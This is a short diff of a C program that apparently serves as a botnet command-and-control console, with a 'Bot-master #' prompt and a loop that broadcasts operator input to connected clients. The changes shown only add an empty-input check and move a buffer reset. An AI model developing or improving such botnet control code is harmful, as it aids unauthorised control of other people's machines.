@@ -114,6 +114,8 @@ int main(int argc, char **argv)
        {
            printf("Bot-master #");
            fgets(message,255,stdin);
+           if(strlen(message) < 2)
+               continue;
            strncpy(message_temp,message,sizeof(message_temp));
            temp = strtok(message_temp," ");
            strncpy(instruction,temp,sizeof(temp));
@@ -177,8 +179,8 @@ int main(int argc, char **argv)
            {
                write(client[i].fd,message,sizeof(message));
            }
-           memset(message,'\0',255);
        }
+       memset(message,'\0',255);
    }
    return 0;
 }
